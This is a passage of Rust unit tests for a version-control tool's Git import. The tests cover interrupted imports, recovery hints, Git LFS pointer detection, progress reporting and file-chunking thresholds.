        }
    }

    /// Once `.opalro` is begun, a stop says the folder is kept; but not when there's no `.opalro` to
    /// keep, nor when `format` was written and only the flush after it failed, since then the
    /// project is made.
    #[test]
    fn only_a_opal_without_format_is_kept_for_a_run_to_finish() {
        let dir = tempfile::tempdir().unwrap();
        let stop = || ImportError::Stop {
            what: "stopped".into(),
            hint: None,
        };
        assert!(matches!(
            after_begin(dir.path(), stop()),
            ImportError::Stop { .. }
        ));
        std::fs::create_dir(dir.path().join(".opalro")).unwrap();
        let kept = after_begin(dir.path(), stop());
        assert!(
            matches!(
                kept,
                ImportError::Unfinished {
                    committed: false,
                    ..
                }
            ),
            "{kept:?}"
        );
        assert!(kept.hint().unwrap().ends_with("Or delete that folder."));
        // Once a head is written its entry may hold the whole import: no deleting is offered.
        std::fs::create_dir(dir.path().join(".opalro/state")).unwrap();
        std::fs::write(dir.path().join(".opalro/state/head"), b"").unwrap();
        let kept = after_begin(dir.path(), stop());
        assert!(
            matches!(
                kept,
                ImportError::Unfinished {
                    committed: true,
                    ..
                }
            ),
            "{kept:?}"
        );
        let hint = kept.hint().unwrap();
        assert!(
            hint.contains("Run opalro import again here to finish it") && !hint.contains("delete"),
            "{hint}"
        );
        std::fs::write(dir.path().join(".opalro/format"), crate::repo::FORMAT_TEXT).unwrap();
        assert!(matches!(
            after_begin(dir.path(), stop()),
            ImportError::Stop { .. }
        ));
    }

    /// Where other accounts can write, the hint says to move the project, so it can't also say
    /// to come back and finish the import in place.
    #[test]
    fn a_stopped_start_says_how_to_finish_only_where_the_folder_can_be_trusted() {
        let hint_for = |path: &Path| {
            let refusal = RepoError::NotYours {
                path: path.to_owned(),
            };
            let stopped = RepoError::StartStopped {
                refusal: Box::new(refusal),
            };
            match starting(stopped) {
                ImportError::Stop { hint, .. } => hint.unwrap(),
                other => panic!("{other:?}"),
            }
        };
        let hint = hint_for(Path::new("/srv/work"));
        assert!(
            hint.ends_with("\nThen run opalro import again to finish."),
            "{hint}"
        );
        let folder = tempfile::tempdir().unwrap();
        let hint = hint_for(&crate::test_support::open_to_all(folder.path()));
        assert!(
            hint.ends_with("Move your project into a folder of your own."),
            "{hint}"
        );
    }

    /// Opalro keeps up to 16 packs open between reads, and goes on reading one it has open as it
    /// was, so the pack removed here is one the import hasn't read from yet.
    #[test]
    fn import_stops_cleanly_when_git_removes_a_pack() {
        use ObjectType::{Blob, Commit, Tree};
        let dir = tempfile::tempdir().unwrap();
        let git = Craft::new(dir.path(), HashKind::Sha1);
        let id = |kind, data: &[u8]| object_id(kind, data, HashKind::Sha1).unwrap();
        let tree = |blob: GitId| [b"100644 a.txt\0".as_slice(), blob.as_bytes()].concat();
        let commit = |tree: &[u8], parent: Option<&[u8]>, message: &str| {
            let mut raw = format!("tree {}\n", id(Tree, tree).to_hex());
            if let Some(parent) = parent {
                raw += &format!("parent {}\n", id(Commit, parent).to_hex());
            }
            raw + "author A <a@example.com> 0 +0000\ncommitter A <a@example.com> 0 +0000\n\n"
                + message
        };
        let (one, two) = (b"one".to_vec(), b"two".to_vec());
        let (tree1, tree2) = (tree(id(Blob, &one)), tree(id(Blob, &two)));
        let first = commit(&tree1, None, "One\n");
        let second = commit(&tree2, Some(first.as_bytes()), "Two\n");
        // All but the second commit's file in one pack, which the import reads before it writes
        // anything; that file alone in another.
        git.pack(&[
            PackEntry::Whole(Commit, first.clone().into_bytes()),
            PackEntry::Whole(Commit, second.clone().into_bytes()),
            PackEntry::Whole(Tree, tree1),
            PackEntry::Whole(Blob, one),
            PackEntry::Whole(Tree, tree2),
        ]);
        let (later, _) = git.pack(&[PackEntry::Whole(Blob, two)]);
        let head = id(Commit, second.as_bytes()).to_hex();
        git.loose_ref("refs/heads/main", &format!("{head}\n"));
        // Once the first commit is converted, after the first pass.
        let mut progress = |pass, done: u64, _: Option<u64>| {
            if pass == ImportPass::Importing && done == 1 {
                std::fs::remove_file(&later).unwrap();
            }
        };
        let mut opened = None;
        let result = import_git(
            dir.path(),
            &mut ImportRequest {
                who: &who(),
                command: "import",
                git_settings: None,
                progress: &mut progress,
            },
            &mut opened,
        );
        let Err(stopped @ ImportError::Unfinished { .. }) = result else {
            panic!("{result:?}");
        };
        assert!(
            matches!(
                &stopped,
                ImportError::Unfinished { stop, committed: false }
                    if matches!(**stop, ImportError::Git(GitError::Changed { .. }))
            ),
            "{stopped:?}"
        );
        assert!(!later.exists(), "the pack was removed");
        assert!(!dir.path().join(".opalro/format").exists());
        // The `.opalro` begun stays, for a run to finish, and the hint says so instead of saying
        // that nothing was changed. The caller holds the project, to show what its store noticed.
        let hint = stopped.hint().unwrap();
        assert!(
            hint.starts_with("Run opalro import again once Git has finished."),
            "{hint}"
        );
        assert!(
            hint.contains("Opalro kept the .opalro folder it began"),
            "{hint}"
        );
        assert!(!hint.contains("Nothing was changed"), "{hint}");
        assert!(opened.is_some());
    }

    /// The first pass's look for missing Git LFS objects counts each commit's new trees against a
    /// save's limits, no more than the converter counts, and past them leaves the stop to the
    /// converter. A comment in `.gitattributes` is no sign of Git LFS.
    #[test]
    fn the_look_for_missing_lfs_objects_keeps_to_a_saves_limits() {
        let pointer = b"version https://git-lfs.github.com/spec/v1\noid sha256:\
            4d7a214614ab2935c943f9e0ff69d22eadbb8f32b1258daaa5e2ca24d17e2393\nsize 12345\n";
        // `art/deep/big.psd`: two levels below the top, and three entries with the top's one.
        let made = |attributes: Option<&[u8]>| {
            let dir = tempfile::tempdir().unwrap();
            let git = Craft::new(dir.path(), HashKind::Sha1);
            let blob = git.object(ObjectType::Blob, pointer);
            let deep = git.tree(&[(b"100644", b"big.psd", blob)]);
            let art = git.tree(&[(b"40000", b"deep", deep)]);
            let tree = match attributes {
                Some(text) => {
                    let attrs = git.object(ObjectType::Blob, text);
                    git.tree(&[
                        (b"100644", b".gitattributes", attrs),
                        (b"40000", b"art", art),
                    ])
                }
                None => git.tree(&[(b"40000", b"art", art)]),
            };
            let commit = commit_on(&git, &tree, &[], "One\n");
            (dir, commit)
        };
        let scan = |dir: &Path, commit: &GitId, limits: &dyn Fn() -> SaveLimits| {
            let repo = git::Repo::open(dir).unwrap();
            check_lfs_objects(&repo, commit, &[*commit], None, limits, &mut |_, _, _| {})
        };
        let small = |depth, entries| move || SaveLimits::new(depth, entries);
        let missing = |r| matches!(r, Err(ImportError::LfsMissing { count: 1, .. }));
        let (dir, commit) = made(None);
        assert!(
            scan(dir.path(), &commit, &small(2, 3)).is_ok(),
            "no sign of Git LFS"
        );
        std::fs::create_dir(dir.path().join(".git/lfs")).unwrap();
        assert!(missing(scan(dir.path(), &commit, &small(2, 3))));
        assert!(
            scan(dir.path(), &commit, &small(1, 3)).is_ok(),
            "a level short"
        );
        assert!(
            scan(dir.path(), &commit, &small(2, 2)).is_ok(),
            "an entry short"
        );
        // `art/deep/big.psd` is 16 bytes.
        let within = |bytes| move || SaveLimits::default().with_max_path(bytes);
        assert!(missing(scan(dir.path(), &commit, &within(16))));
        assert!(
            scan(dir.path(), &commit, &within(15)).is_ok(),
            "a byte short"
        );
        let line = b"*.psd filter=lfs diff=lfs merge=lfs -text\n";
        let commented = [&b" \t# "[..], line].concat();
        let (dir, commit) = made(Some(commented.as_slice()));
        assert!(
            scan(dir.path(), &commit, &small(2, 4)).is_ok(),
            "only a comment"
        );
        let (dir, commit) = made(Some(line));
        assert!(missing(scan(dir.path(), &commit, &small(2, 4))));
    }

    /// Git checks a link out as it is, so the import passes over one holding a pointer's text,
    /// whose object is missing, and brings it in as it is; a file holding that text is a Git LFS
    /// file.
    #[test]
    fn a_link_holding_a_pointer_is_no_git_lfs_file() {
        let pointer = b"version https://git-lfs.github.com/spec/v1\noid sha256:\
            4d7a214614ab2935c943f9e0ff69d22eadbb8f32b1258daaa5e2ca24d17e2393\nsize 12345\n";
        let made = |mode: &[u8]| {
            let dir = tempfile::tempdir().unwrap();
            let git = Craft::new(dir.path(), HashKind::Sha1);
            std::fs::create_dir(dir.path().join(".git/lfs")).unwrap();
            let blob = git.object(ObjectType::Blob, pointer);
            let tree = git.tree(&[(mode, b"big.psd", blob)]);
            let commit = commit_on(&git, &tree, &[], "One\n");
            git.loose_ref("refs/heads/main", &format!("{}\n", commit.to_hex()));
            (dir, commit)
        };
        let (dir, commit) = made(b"120000");
        let repo = git::Repo::open(dir.path()).unwrap();
        let first = check_lfs_objects(
            &repo,
            &commit,
            &[commit],
            None,
            &SaveLimits::default,
            &mut |_, _, _| {},
        );
        assert!(first.is_ok(), "{first:?}");
        drop(repo);
        let report = import(dir.path()).unwrap();
        assert_eq!(report.lfs_files, 0);
        let project = Repository::open(dir.path()).unwrap();
        let save = project.current().unwrap().1.state.lines["main"];
        let root = project.store().save(&save, false).unwrap().root;
        let link = project
            .store()
            .listing(&root)
            .unwrap()
            .get("big.psd")
            .cloned();
        let mut target = Vec::new();
        project
            .store()
            .copy_content(&link.unwrap().id, &mut target)
            .unwrap();
        assert_eq!(target, pointer);
        let (dir, commit) = made(b"100644");
        let repo = git::Repo::open(dir.path()).unwrap();
        let first = check_lfs_objects(
            &repo,
            &commit,
            &[commit],
            None,
            &SaveLimits::default,
            &mut |_, _, _| {},
        );
        assert!(matches!(
            first,
            Err(ImportError::LfsMissing { count: 1, .. })
        ));
    }

    /// Each commit's walk counts only the trees not walked before, so a folder two commits share
    /// counts once: the first pass can let through a commit the converter will refuse, and looks
    /// on. Past its limits, it stops looking.
    #[test]
    fn the_first_pass_counts_each_commits_new_trees_against_its_limits() {
        let dir = tempfile::tempdir().unwrap();
        let git = Craft::new(dir.path(), HashKind::Sha1);
        std::fs::create_dir(dir.path().join(".git/lfs")).unwrap();
        let shared = git.tree(&[(b"100644", b"x.txt", git.object(ObjectType::Blob, b"x\n"))]);
        let one = commit_on(&git, &git.tree(&[(b"40000", b"a", shared)]), &[], "One\n");
        // The shared folder twice: 4 entries to the converter, 2 new ones here.
        let both = git.tree(&[(b"40000", b"a", shared), (b"40000", b"b", shared)]);
        let two = commit_on(&git, &both, &[one], "Two\n");
        let pointer = b"version https://git-lfs.github.com/spec/v1\noid sha256:\
            4d7a214614ab2935c943f9e0ff69d22eadbb8f32b1258daaa5e2ca24d17e2393\nsize 12345\n";
        let big = git.object(ObjectType::Blob, pointer);
        let art = git.tree(&[(b"100644", b"big.psd", big)]);
        let three = commit_on(
            &git,
            &git.tree(&[(b"40000", b"art", art)]),
            &[two],
            "Three\n",
        );
        let repo = git::Repo::open(dir.path()).unwrap();
        let order = [one, two, three];
        let scan = |entries| {
            let limits = move || SaveLimits::new(10, entries);
            check_lfs_objects(&repo, &three, &order, None, &limits, &mut |_, _, _| {})
        };
        assert!(matches!(
            scan(3),
            Err(ImportError::LfsMissing { count: 1, .. })
        ));
        // `one` alone has 2 entries.
        assert!(scan(1).is_ok());
    }

    /// Each object is looked for once, however many files and commits point to it, so the count
    /// and total size are of objects; sizes from pointers, which are untrusted, add up without
    /// overflowing.
    #[test]
    fn missing_lfs_objects_are_counted_once_each() {
        let dir = tempfile::tempdir().unwrap();
        let git = Craft::new(dir.path(), HashKind::Sha1);
        let oid = |n: u8| format!("{n:02x}").repeat(32);
        let pointer = |n: u8, size: u64| {
            let text = format!(
                "version https://git-lfs.github.com/spec/v1\noid sha256:{}\nsize {size}\n",
                oid(n)
            );
            git.object(ObjectType::Blob, text.as_bytes())
        };
        let huge = i64::MAX as u64;
        let (a, b, c) = (pointer(1, huge), pointer(2, huge), pointer(3, huge));
        // The same object again, by a pointer written another way.
        let crlf = format!(
            "version https://git-lfs.github.com/spec/v1\r\noid sha256:{}\r\nsize {huge}\r\n",
            oid(1)
        );
        let again = git.object(ObjectType::Blob, crlf.as_bytes());
        let first = git.tree(&[
            (b"100644", b"a.psd", a),
            (b"100644", b"b.psd", b),
            (b"100755", b"c.psd", c),
        ]);
        let first = commit_on(&git, &first, &[], "One\n");
        let second = git.tree(&[(b"100644", b"again.psd", again), (b"100644", b"b.psd", b)]);
        let second = commit_on(&git, &second, &[first], "Two\n");
        std::fs::create_dir(dir.path().join(".git/lfs")).unwrap();
        let repo = git::Repo::open(dir.path()).unwrap();
        let order = [first, second];
        match check_lfs_objects(
            &repo,
            &second,
            &order,
            None,
            &SaveLimits::default,
            &mut |_, _, _| {},
        ) {
            Err(ImportError::LfsMissing {
                first: listed,
                count,
                bytes,
                ..
            }) => {
                assert_eq!((count, bytes), (3, u64::MAX));
                let paths: Vec<&str> = listed.iter().map(|(_, path, _)| path.as_str()).collect();
                assert_eq!(paths, ["a.psd", "b.psd", "c.psd"]);
                assert!(listed.iter().all(|(commit, ..)| *commit == first.to_hex()));
            }
            other => panic!("{other:?}"),
        }
    }

    /// The first pass says how many commits it has read, as it goes, before it knows how many
    /// there are; then the second says how many of them it has converted.
    #[test]
    fn progress_counts_the_commits_read_then_those_converted() {
        let dir = tempfile::tempdir().unwrap();
        let git = Craft::new(dir.path(), HashKind::Sha1);
        let tree = git.tree(&[]);
        let first = commit_on(&git, &tree, &[], "one\n");
        let second = commit_on(&git, &tree, &[first], "two\n");
        git.loose_ref("refs/heads/main", &format!("{}\n", second.to_hex()));
        let mut heard = Vec::new();
        let report = import_git(
            dir.path(),
            &mut ImportRequest {
                who: &who(),
                command: "import",
                git_settings: None,
                progress: &mut |pass, done, total| heard.push((pass, done, total)),
            },
            &mut None,
        );
        assert_eq!(report.unwrap().commits, 2);
        use ImportPass::{Importing, ReadingHistory};
        assert_eq!(
            heard,
            [
                (ReadingHistory, 1, None),
                (ReadingHistory, 2, None),
                (Importing, 1, Some(2)),
                (Importing, 2, Some(2))
            ]
        );
    }

    /// With a sign of Git LFS, the look for its files says how many commits it has looked at.
    #[test]
    fn an_import_reports_its_first_pass() {
        let dir = tempfile::tempdir().unwrap();
        let git = Craft::new(dir.path(), HashKind::Sha1);
        std::fs::create_dir(dir.path().join(".git/lfs")).unwrap();
        let tree = git.tree(&[]);
        let first = commit_on(&git, &tree, &[], "one\n");
        let second = commit_on(&git, &tree, &[first], "two\n");
        git.loose_ref("refs/heads/main", &format!("{}\n", second.to_hex()));
        let mut heard = Vec::new();
        import_git(
            dir.path(),
            &mut ImportRequest {
                who: &who(),
                command: "import",
                git_settings: None,
                progress: &mut |pass, done, total| heard.push((pass, done, total)),
            },
            &mut None,
        )
        .unwrap();
        let checking: Vec<_> = heard
            .iter()
            .filter(|(pass, ..)| *pass == ImportPass::CheckingLfs)
            .map(|&(_, done, total)| (done, total))
            .collect();
        assert_eq!(checking, [(1, Some(2)), (2, Some(2))]);
    }

    /// The `opalro.toml` of the Git checkout an import runs in decides which files it cuts, and so
    /// does a project's for the safety copies of a discard.
    #[test]
    fn safety_copies_and_imports_use_the_threshold_too() {
        use crate::journal::{Action, Change, Expected};
        use crate::listing::EntryKind;
        use crate::pack::{ObjectKind, PackReader};
        use crate::test_support::noise;

        let big = noise(9, 2 << 20);
        let mine = noise(10, 2 << 20);
        for (rules, cut) in [
            (Some("chunk-files-over = \"4 MiB\"\n"), false),
            (None, true),
        ] {
            let dir = tempfile::tempdir().unwrap();
            let git = Craft::new(dir.path(), HashKind::Sha1);
            let blob = git.object(ObjectType::Blob, &big);
            let tree = git.tree(&[(b"100644", b"big", blob)]);
            let raw = format!(
                "tree {}\nauthor A <a@example.com> 0 +0000\ncommitter A <a@example.com> 0 \
                 +0000\n\nOne\n",
                tree.to_hex()
            );
            let commit = git.commit(raw.as_bytes());
            git.loose_ref("refs/heads/main", &format!("{}\n", commit.to_hex()));
            if let Some(rules) = rules {
                std::fs::write(dir.path().join("opalro.toml"), rules).unwrap();
            }
            import(dir.path()).unwrap();
            let packs = std::fs::read_dir(dir.path().join(".opalro/store/packs")).unwrap();
            let lists: usize = packs
                .map(|p| p.unwrap().path())
                .filter(|p| p.extension().is_some_and(|e| e == "pack"))
                .map(|p| {
                    let pack = PackReader::open(&p).unwrap();
                    let entries = pack.entries().map(|e| e.unwrap());
                    entries.filter(|e| e.kind == ObjectKind::ChunkList).count()
                })
                .sum();
            assert_eq!(lists, usize::from(cut), "{rules:?}");

            let mut repo = Repository::open(dir.path()).unwrap();
            std::fs::write(dir.path().join("mine"), &mine).unwrap();
            let id = crate::id::hash_content(&mine);
            let actions = vec![Action {
                path: "mine".into(),
                change: Change::RemoveFile,
                expected: Some(Expected {
                    kind: EntryKind::File,
                    id,
                    size: mine.len() as u64,
                }),
            }];
            let from = crate::history::current_save(&repo).unwrap();
            let _lock = repo.lock_for_change("discard", &mut |_| {}).unwrap();
            let drive = crate::drive::probe(repo.tmp_folder()).unwrap();
            let mut packs = repo.new_packs().unwrap();
            let copies =
                crate::writeout::keep_safety_copies(&repo, &actions, from, drive, &mut packs)
                    .unwrap();
            assert_eq!(copies.len(), 1);
            let kind = if cut {
                ObjectKind::ChunkList
            } else {
                ObjectKind::Content
            };
            assert_eq!(packs.kind_of(&id), Some(kind), "{rules:?}");
        }
    }
}
